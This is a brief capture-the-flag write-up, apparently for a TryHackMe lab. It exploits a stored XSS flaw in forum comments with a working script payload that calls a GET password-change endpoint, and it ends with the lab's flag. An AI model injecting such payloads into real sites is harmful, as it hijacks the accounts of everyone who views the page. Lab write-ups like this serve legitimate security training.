# XSS

- To update password this site does a GET to `/settings?new_password=pass123`
- There is XSS vuln in the forum comments. No HTML tags are stripped. Add a comment of `<script>fetch('/settings?new_password=pass123');</script>`
- Anyone who visits that site will get their password changed
- Log in as the grinch and retrieve flag `THM{NO_MORE_BUTTMAS}`